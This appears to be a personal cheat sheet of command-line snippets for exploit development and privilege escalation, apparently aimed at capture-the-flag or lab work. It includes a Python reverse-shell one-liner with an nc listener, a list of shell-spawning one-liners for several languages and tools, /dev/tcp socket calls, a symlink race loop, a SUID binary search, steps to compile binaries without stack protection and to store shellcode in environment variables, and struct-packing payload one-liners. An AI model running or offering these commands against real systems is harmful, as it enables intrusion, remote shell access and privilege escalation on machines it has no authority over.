useful comandline usefulness:
use this instead of redirecting a file to stdin, it will let you interact with the application
(python -c "print '<payload>'";cat -) | /path/to/application

Helps if your payload has a \x20 in it, this will keep it all a part of the same string
"$(python -c "print '<payload>'")"

For race conditions related to file path inputs (remove T flag if file must be seen as a symbolic link). Just throw this in a second terminal 
while [ 1 ]; do ln -sfT /link/points/to/valid/file /link/location; ln -sfT /link/points/to/invalid/file /link/location; done


compiling an insecure binary
gcc -Wall -m32 -fPIC -DPIC -fno-stack-protector -c badlib.c
ld -m elf_i386 -shared -o badlib.so badlib.o -ldl

store your shellcode in environment variables
export EGG=$(python -c "print '<payload>")

for compiling assembly
nasm -f elf my_bin.asm; ld -m elf_i386 -s -o my_bin my_bin.o

to get the opcodes from the binary you've compiled (this is definitly not the best way to do this)
objdump -d <binary>

https://netsec.ws/?p=337 has a good list, but i'll put them here in case the website isn't up forever, since it looks like that site is  not often updated
"""

Shell Spawning

python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl â€”e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within IRB)
exec "/bin/sh"
(From within vi)
:!bash
(From within vi)
:set shell=/bin/bash:shell
(From within nmap)
!sh

"""

you can make some calls out like this and receive some too
http://xmodulo.com/tcp-udp-socket-bash-shell.html
exec {file-descriptor}<>/dev/{protocol}/{host}/{port}
exec 3<>/dev/tcp/xmodulo.com/80

decent reverse shell one liner (source https://github.com/swisskyrepo/PayloadsAllTheThings):
python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',7003));[os.dup2(s.fileno(),i) for i in [1,2,3]];pty.spawn('/bin/bash');s.close()" 

listener:
nc -lvp 7003 

compress file to stdout:
cat file.txt | gzip -f > file.txt.gz

Find the important binarys, if you're lucky they are custom built
find / -perm -u=s -type f 2>/dev/null


# For quick one liner exploit dev (python2's looks better but python2 also is worse):
python -c "import sys,struct;x=lambda a:struct.pack('I', a);sys.stdout.buffer.write(('D'*32).encode() + x(0x41414141))"
python2.7 -c "import struct;x=lambda a:struct.pack('I', a);print x(0x41414141)"


